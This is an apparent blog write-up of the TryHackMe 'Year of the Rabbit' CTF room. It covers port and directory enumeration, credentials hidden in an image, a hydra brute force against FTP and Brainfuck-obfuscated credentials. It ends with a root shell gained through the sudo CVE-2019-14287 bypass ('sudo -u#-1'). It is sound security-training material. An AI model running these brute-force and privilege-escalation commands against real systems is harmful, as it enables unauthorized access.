---
layout: post
title: TryHackMe | Year of the Rabbit
date: 2024-07-09 18:59 +0100
categories: [TryHackMe, Easy]
tags: [brute-force, ctf, ftp, infosec, nmap, ssh, hydra, ffuf, year-of-the-rabbit, cve-2019-14287, writeup, easy, directory-brute-force, obfuscation, steganography, tryhackme, linpeas]
toc: true
media_subpath: '/assets/img/posts/2024/tryhackme-year-of-the-rabbit'
image: 
  path: thumbnail.jpeg
  alt: TryHackMe | Year of the Rabbit
---

## Introduction

***

**Name: [Year of the Rabbit](https://tryhackme.com/r/room/yearoftherabbit)**

**Creator: MuirlandOracle**

**Release Date: 09-04-2020** 

**Difficulty: Easy**

Prepare to rip your hair out as this box quickly makes its rabbit holes apparent.

***

### Enumeration

***

We begin with an Nmap scan: `nmap -sV -sC -oN scan-results.txt <TARGET IP>`.

```console
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.10 (Debian)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
The scan reveals three open ports. We cannot login anonymously to the FTP server, and the SSH server is not vulnerable. Thus, we focus our efforts on the web server.

![Desktop View](thm-year-of-the-rabbit-webserver.png)
_When visiting the website, we find the default Apache2 web page._

Viewing the page source is always a good shout, but in this case, the page source holds no valuable information. Therefore, the next best step is to perform a directory bruteforce attack in FFuf. 

`ffuf -u http://<TARGET IP>/FUZZ -w  /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt` 

```console
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.159.142/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 :: File format      : json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

# Copyright 2007 James Fisher [Status: 200, Size: 7853, Words: 2862, Lines: 190, Duration: 23ms]
# [Status: 200, Size: 7853, Words: 2862, Lines: 190, Duration: 24ms]
# directory-list-2.3-medium.txt [Status: 200, Size: 7853, Words: 2862, Lines: 190, Duration: 25ms]
assets [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 17ms]
```

![Desktop View](thm-year-of-the-rabbit-assets-directory.png)

We find an assets directory on the server. It contains two files, a `.mp4` file, and a css style sheet. The `.mp4` file is a red herring, as it is video rather infamous in internet culture, and because it bluntly tells us we are looking in the wrong place.
Let's explore the contents of the css style sheet. 

![Desktop View](thm-year-of-the-rabbit-css-file.png)
_Our diligence is rewarded with a clue. Good job we checked the style sheet._
Upon navigating to the page, we get told to turn off our JavaScript and rickrolled thereafter. No matter, let’s use our browser’s network monitor to see what’s really going on.

![Desktop View](thm-year-of-the-rabbit-hidden-directory.png)

Aha, a hidden directory. 

![Desktop View](thm-year-of-the-rabbit-WExYY2Cv-qU-directory.png) 
_Contents of the WExYY2Cv-QU directory._

Inside we find a single `.png` file, a photo of Swedish model Lena Forsén. While the photo appears unmodified, using the strings command on it in our terminal reveals a hidden message.

```console 

strings Hot_Babe.png 

Eh, you've earned this. Username for FTP is ftpuser
One of these is the password:
Mou+56n%QK8sr
1618B0AUshw1M
A56IpIl%1s02u
vTFbDzX9&Nmu?
FfF~sfu^UQZmT
8FF?iKO27b~V0
[OUTPUT OMMITED]
```

***

### Exploitation

After a lengthy enumeration, we have a username for the FTP server, and some possible passwords. Let’s create a wordlist using those passwords and launch a brute force attack against the FTP server with hydra. 

```console 

hydra -l ftpuser -P passwords.txt ftp://<TARGET IP>
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-07-02 12:56:21
[DATA] max 16 tasks per 1 server, overall 16 tasks, 82 login tries (l:1/p:82), ~6 tries per task
[DATA] attacking ftp://10.10.188.185:21/
[21][ftp] host: 10.10.188.185   login: ftpuser   password: [PASSWORD REDACTED]
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-07-02 12:56:36
```

Fantastic, we have access to the FTP server, let's login.

```console

ftp ftpuser@<TARGET IP>
230 Login successful.
ftp> ls 
Eli's_Creds.txt
ftp> get Eli's_Creds.txt
```
Inside we find and download Eli's credentials, let's see what they are.
```console
cat Eli's_Creds.txt 
+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+
+++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<
]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+
++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->---
--<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++
+<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+
++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++
<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++
<]>+. <+++[ ->--- <]>-- ---.- ----. <
```

It is difficult to discern Eli’s credentials. We will use the website decode.fr to identify how they have been obfuscated, and then hopefully deobfuscate them[^footnote].

![Desktop View](thm-year-of-the-rabbit-obfuscated-credentials.png) 

decode.fr suggests the credentials are obfuscated with the Brainfuck programming language. Let's see what they are in plain-text. 

![Desktop View](thm-year-of-the-rabbit-deobfuscated-credentials.png) 

There we go, now we can access the machine via SSH, a proper foothold at last. 

***

### Privilege-Escalation

```console
ssh eli@<TARGET IP> 

1 new message
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

END MESSAGE

eli@year-of-the-rabbit:~$
```

Okay, so we're logged in and greeted with a message informing us of not only another user on the system, but a secret hiding place. Let's see what locate can dig up about that.


```console
eli@year-of-the-rabbit:~$ locate "s3cr3t"
/usr/games/s3cr3t
/usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
/var/www/html/sup3r_s3cr3t_fl4g.php
```
A secret message? Let's read it. 

```console
cat /usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly\! 
Your password is awful, Gwendoline. 
It should be at least 60 characters long! Not just [PASSWORD REDACTED]
Honestly!

Yours sincerely
   -Root
```

And with that information, we can switch our user to Gwendoline and get the user flag.

```console
eli@year-of-the-rabbit:~$ su gwendoline
Password: 
gwendoline@year-of-the-rabbit:/home/eli$ cat /home/gwendoline/user.txt
THM{FLAG REDACTED}
```

Now let's root this machine. But with all this box has thrown with us so far, we'd best make life easy and scp linPEAS onto the system.

```console
scp linpeas.sh gwendoline@<TARGET IP>:/home/gwendoline 
```
After running linPEAS we learn that we have some interesting permissions on the `user.txt` file.
```console
User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```

Normally this would be a deadend, we cannot execute the command as a root user. However, linPEAS found the sudo version on this box vulnerable to CVE-2019-14287 [^footnote2]. Versions of sudo lower than 1.8.28 don’t properly check user ids. For instance, passing an id of -1 in our command returns an id of 0, root’s id. Ergo, we can manipulate the system by having it execute our command as root.

```console
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```

![Desktop View](thm-year-of-the-rabbit-root-shell-in-vi.png) 
_Type the following in vi and press the return key to get a root shell._

```console
whoami
root
cat /root/root.txt
THM{FLAG REDACTED}
```

**Its over, the rabbit is stewed!**

***

### References

[^footnote]: https://www.dcode.fr/cipher-identifier
[^footnote2]: https://www.exploit-db.com/exploits/47502